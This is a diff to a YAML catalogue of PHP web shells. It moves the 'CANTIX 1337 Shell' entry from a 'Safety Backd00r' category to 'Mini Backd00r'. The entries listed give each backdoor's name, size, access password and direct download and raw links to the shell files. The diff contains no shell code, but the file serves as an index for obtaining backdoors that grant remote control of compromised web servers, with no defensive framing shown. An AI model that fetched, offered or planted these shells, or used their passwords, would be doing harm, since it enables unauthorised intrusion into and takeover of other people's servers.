@@ -44,15 +44,6 @@
   raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/b373.php"
 
 - category: "Safety Backd00r"
-  name: "CANTIX 1337 Shell"
-  image: "https://adilhyz.github.io/WebShell/preview/cantix.webp"
-  size: "19kb"
-  password: "girls8i"
-  version: "-"
-  download: "https://adilhyz.github.io/WebShell/PHP/cantix1337.php"
-  raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/cantix1337.php"
-
-- category: "Safety Backd00r"
   name: "IndoSec Shell"
   image: "https://adilhyz.github.io/WebShell/preview/ix.webp"
   size: "130kb"
@@ -115,6 +106,16 @@
   password: "-"
   download: "https://adilhyz.github.io/WebShell/PHP/mini/b374km.php"
   raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/mini/b374km.php"
+
+- category: "Mini Backd00r"
+  name: "CANTIX 1337 Shell"
+  image: "https://adilhyz.github.io/WebShell/preview/cantix.webp"
+  size: "19kb"
+  password: "girls8i"
+  version: "-"
+  download: "https://adilhyz.github.io/WebShell/PHP/cantix1337.php"
+  raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/cantix1337.php"
+
 
 - category: "Mini Backd00r"
   name: "Minigray Shell"
